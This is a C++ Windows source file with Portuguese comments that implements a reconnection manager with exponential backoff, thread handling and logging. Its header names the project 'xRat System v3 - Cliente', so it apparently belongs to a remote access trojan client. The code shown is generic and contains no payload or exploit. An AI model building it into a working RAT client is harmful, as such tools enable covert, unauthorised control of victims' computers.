// =============================================================================
// ReconnectionManager Implementation - Sistema de Reconexão Automática
// =============================================================================
// Projeto: xRat System v3 - Cliente
// Arquivo: network/ReconnectionManager.cpp
// Descrição: Implementação do sistema de reconexão com backoff exponencial
// Autor: Desenvolvedor C++
// Data: 12/08/2025
// =============================================================================

#include "network/ReconnectionManager.h"
#include "utils/AppUtils.h"
#include <sstream>
#include <algorithm>

using namespace Network;

// =============================================================================
// IMPLEMENTAÇÃO DOS MÉTODOS PÚBLICOS
// =============================================================================

ReconnectionManager::ReconnectionManager()
{
    // Inicializar estado
    state = RECONNECTION_IDLE;
    currentAttempts = 0;
    lastAttemptTime = 0;
    currentDelay = 0;
    shouldStop = false;
    reconnectionThread = NULL;
    connectionCallback = nullptr;
    
    // Inicializar seção crítica
    InitializeCriticalSection(&criticalSection);
    
    AppUtils::WriteLog("ReconnectionManager: Instância criada", "INFO");
}

ReconnectionManager::~ReconnectionManager()
{
    Shutdown();
    DeleteCriticalSection(&criticalSection);
    AppUtils::WriteLog("ReconnectionManager: Instância destruída", "INFO");
}

bool ReconnectionManager::Initialize(ConnectionCallback callback)
{
    EnterCriticalSection(&criticalSection);
    
    if (callback == nullptr)
    {
        AppUtils::WriteLog("ReconnectionManager: Callback de conexão não pode ser nulo", "ERROR");
        LeaveCriticalSection(&criticalSection);
        return false;
    }
    
    connectionCallback = callback;
    state = RECONNECTION_IDLE;
    currentAttempts = 0;
    
    AppUtils::WriteLog("ReconnectionManager: Inicializado com sucesso", "INFO");
    LeaveCriticalSection(&criticalSection);
    return true;
}

void ReconnectionManager::Shutdown()
{
    AppUtils::WriteLog("ReconnectionManager: Iniciando shutdown", "INFO");
    
    // Parar reconexão
    StopReconnection();
    
    EnterCriticalSection(&criticalSection);
    connectionCallback = nullptr;
    state = RECONNECTION_IDLE;
    LeaveCriticalSection(&criticalSection);
    
    AppUtils::WriteLog("ReconnectionManager: Shutdown completo", "INFO");
}

void ReconnectionManager::ConfigureSettings(const ReconnectionConfig& newConfig)
{
    EnterCriticalSection(&criticalSection);
    
    config = newConfig;
    
    // Validar configurações
    if (config.maxAttempts <= 0) config.maxAttempts = 10;
    if (config.initialDelay <= 0) config.initialDelay = 1000;
    if (config.maxDelay < config.initialDelay) config.maxDelay = config.initialDelay * 10;
    if (config.backoffFactor < 1.0) config.backoffFactor = 2.0;
    if (config.timeout <= 0) config.timeout = 5000;
    
    std::stringstream ss;
    ss << "ReconnectionManager: Configuração atualizada - "
       << "Habilitado: " << (config.enabled ? "SIM" : "NÃO")
       << ", Max tentativas: " << config.maxAttempts
       << ", Delay inicial: " << config.initialDelay << "ms"
       << ", Delay máximo: " << config.maxDelay << "ms"
       << ", Fator backoff: " << config.backoffFactor;
    
    AppUtils::WriteLog(ss.str(), "CONFIG");
    LeaveCriticalSection(&criticalSection);
}

bool ReconnectionManager::StartReconnection()
{
    EnterCriticalSection(&criticalSection);
    
    if (!config.enabled)
    {
        AppUtils::WriteLog("ReconnectionManager: Reconexão automática está desabilitada", "WARNING");
        LeaveCriticalSection(&criticalSection);
        return false;
    }
    
    if (state == RECONNECTION_ATTEMPTING || state == RECONNECTION_WAITING)
    {
        AppUtils::WriteLog("ReconnectionManager: Reconexão já está em andamento", "WARNING");
        LeaveCriticalSection(&criticalSection);
        return true;
    }
    
    if (connectionCallback == nullptr)
    {
        AppUtils::WriteLog("ReconnectionManager: Callback de conexão não definido", "ERROR");
        LeaveCriticalSection(&criticalSection);
        return false;
    }
    
    // Reseta estado se necessário
    if (state == RECONNECTION_FAILED)
    {
        currentAttempts = 0;
    }
    
    state = RECONNECTION_WAITING;
    currentDelay = config.initialDelay;
    shouldStop = false;
    
    // Criar thread de reconexão
    reconnectionThread = CreateThread(
        NULL,
        0,
        ReconnectionThreadProc,
        this,
        0,
        NULL
    );
    
    if (reconnectionThread == NULL)
    {
        AppUtils::WriteLog("ReconnectionManager: Falha ao criar thread de reconexão", "ERROR");
        state = RECONNECTION_IDLE;
        LeaveCriticalSection(&criticalSection);
        return false;
    }
    
    AppUtils::WriteLog("ReconnectionManager: Processo de reconexão iniciado", "INFO");
    LeaveCriticalSection(&criticalSection);
    return true;
}

void ReconnectionManager::StopReconnection()
{
    EnterCriticalSection(&criticalSection);
    shouldStop = true;
    LeaveCriticalSection(&criticalSection);
    
    if (reconnectionThread != NULL)
    {
        AppUtils::WriteLog("ReconnectionManager: Parando thread de reconexão", "INFO");
        
        // Aguardar thread terminar
        WaitForSingleObject(reconnectionThread, 10000); // 10 segundos timeout
        CloseHandle(reconnectionThread);
        reconnectionThread = NULL;
        
        AppUtils::WriteLog("ReconnectionManager: Thread de reconexão parada", "INFO");
    }
    
    EnterCriticalSection(&criticalSection);
    if (state == RECONNECTION_ATTEMPTING || state == RECONNECTION_WAITING)
    {
        state = RECONNECTION_IDLE;
    }
    LeaveCriticalSection(&criticalSection);
}

bool ReconnectionManager::IsReconnecting() const
{
    return (state == RECONNECTION_ATTEMPTING || state == RECONNECTION_WAITING);
}

ReconnectionState ReconnectionManager::GetState() const
{
    return state;
}

int ReconnectionManager::GetCurrentAttempts() const
{
    return currentAttempts;
}

ReconnectionConfig ReconnectionManager::GetConfig() const
{
    return config;
}

void ReconnectionManager::ResetAttempts()
{
    EnterCriticalSection(&criticalSection);
    currentAttempts = 0;
    if (state == RECONNECTION_FAILED)
    {
        state = RECONNECTION_IDLE;
    }
    AppUtils::WriteLog("ReconnectionManager: Contador de tentativas resetado", "INFO");
    LeaveCriticalSection(&criticalSection);
}

bool ReconnectionManager::ForceReconnect()
{
    EnterCriticalSection(&criticalSection);
    
    if (connectionCallback == nullptr)
    {
        AppUtils::WriteLog("ReconnectionManager: Callback não definido para reconexão forçada", "ERROR");
        LeaveCriticalSection(&criticalSection);
        return false;
    }
    
    AppUtils::WriteLog("ReconnectionManager: Tentativa de reconexão forçada", "INFO");
    
    bool success = connectionCallback();
    
    if (success)
    {
        currentAttempts = 0;
        state = RECONNECTION_SUCCEEDED;
        AppUtils::WriteLog("ReconnectionManager: Reconexão forçada bem-sucedida", "INFO");
    }
    else
    {
        currentAttempts++;
        state = RECONNECTION_FAILED;
        AppUtils::WriteLog("ReconnectionManager: Reconexão forçada falhou", "ERROR");
    }
    
    LeaveCriticalSection(&criticalSection);
    return success;
}

DWORD ReconnectionManager::GetTimeUntilNextAttempt() const
{
    if (state != RECONNECTION_WAITING)
        return 0;
    
    DWORD currentTime = GetTickCount();
    DWORD elapsedTime = currentTime - lastAttemptTime;
    
    if (elapsedTime >= static_cast<DWORD>(currentDelay))
        return 0;
    
    return currentDelay - elapsedTime;
}

std::string ReconnectionManager::GetStatusString() const
{
    std::stringstream ss;
    
    switch (state)
    {
        case RECONNECTION_IDLE:
            ss << "Inativo";
            break;
        case RECONNECTION_WAITING:
            ss << "Aguardando reconexão - Tentativa " << (currentAttempts + 1) 
               << "/" << config.maxAttempts;
            break;
        case RECONNECTION_ATTEMPTING:
            ss << "Tentando reconectar - Tentativa " << (currentAttempts + 1) 
               << "/" << config.maxAttempts;
            break;
        case RECONNECTION_FAILED:
            ss << "Falha após " << currentAttempts << " tentativas";
            break;
        case RECONNECTION_SUCCEEDED:
            ss << "Reconectado com sucesso";
            break;
        default:
            ss << "Estado desconhecido";
            break;
    }
    
    return ss.str();
}

bool ReconnectionManager::HasReachedMaxAttempts() const
{
    return currentAttempts >= config.maxAttempts;
}

// =============================================================================
// IMPLEMENTAÇÃO DOS MÉTODOS PRIVADOS
// =============================================================================

DWORD WINAPI ReconnectionManager::ReconnectionThreadProc(LPVOID lpParam)
{
    ReconnectionManager* manager = static_cast<ReconnectionManager*>(lpParam);
    manager->ReconnectionLoop();
    return 0;
}

void ReconnectionManager::ReconnectionLoop()
{
    AppUtils::WriteLog("ReconnectionManager: Thread de reconexão iniciada", "INFO");
    
    while (!shouldStop && currentAttempts < config.maxAttempts)
    {
        EnterCriticalSection(&criticalSection);
        
        if (shouldStop)
        {
            LeaveCriticalSection(&criticalSection);
            break;
        }
        
        // Aguardar delay antes da tentativa
        state = RECONNECTION_WAITING;
        lastAttemptTime = GetTickCount();
        LeaveCriticalSection(&criticalSection);
        
        // Aguardar com verificação periódica de parada
        DWORD waitTime = currentDelay;
        const DWORD checkInterval = 100; // Verificar a cada 100ms
        
        while (waitTime > 0 && !shouldStop)
        {
            DWORD sleepTime = std::min(waitTime, checkInterval);
            Sleep(sleepTime);
            waitTime -= sleepTime;
        }
        
        if (shouldStop)
            break;
        
        // Fazer tentativa de conexão
        EnterCriticalSection(&criticalSection);
        state = RECONNECTION_ATTEMPTING;
        currentAttempts++;
        LeaveCriticalSection(&criticalSection);
        
        LogReconnectionAttempt();
        
        bool success = false;
        if (connectionCallback != nullptr)
        {
            success = connectionCallback();
        }
        
        LogReconnectionResult(success);
        
        EnterCriticalSection(&criticalSection);
        
        if (success)
        {
            state = RECONNECTION_SUCCEEDED;
            AppUtils::WriteLog("ReconnectionManager: Reconexão bem-sucedida!", "INFO");
            LeaveCriticalSection(&criticalSection);
            break;
        }
        else
        {
            // Calcular próximo delay
            currentDelay = CalculateNextDelay();
            
            if (currentAttempts >= config.maxAttempts)
            {
                state = RECONNECTION_FAILED;
                AppUtils::WriteLog("ReconnectionManager: Máximo de tentativas atingido", "ERROR");
                LeaveCriticalSection(&criticalSection);
                break;
            }
        }
        
        LeaveCriticalSection(&criticalSection);
    }
    
    AppUtils::WriteLog("ReconnectionManager: Thread de reconexão finalizada", "INFO");
}

int ReconnectionManager::CalculateNextDelay()
{
    // Backoff exponencial
    int nextDelay = static_cast<int>(currentDelay * config.backoffFactor);
    
    // Não exceder delay máximo
    if (nextDelay > config.maxDelay)
    {
        nextDelay = config.maxDelay;
    }
    
    return nextDelay;
}

void ReconnectionManager::LogReconnectionAttempt()
{
    std::stringstream ss;
    ss << "ReconnectionManager: Tentativa " << currentAttempts 
       << "/" << config.maxAttempts << " - Timeout: " << config.timeout << "ms";
    
    AppUtils::WriteLog(ss.str(), "INFO");
}

void ReconnectionManager::LogReconnectionResult(bool success)
{
    std::stringstream ss;
    ss << "ReconnectionManager: Tentativa " << currentAttempts;
    
    if (success)
    {
        ss << " - SUCESSO";
        AppUtils::WriteLog(ss.str(), "INFO");
    }
    else
    {
        ss << " - FALHOU";
        if (currentAttempts < config.maxAttempts)
        {
            ss << " - Próxima tentativa em " << currentDelay << "ms";
        }
        AppUtils::WriteLog(ss.str(), "WARNING");
    }
}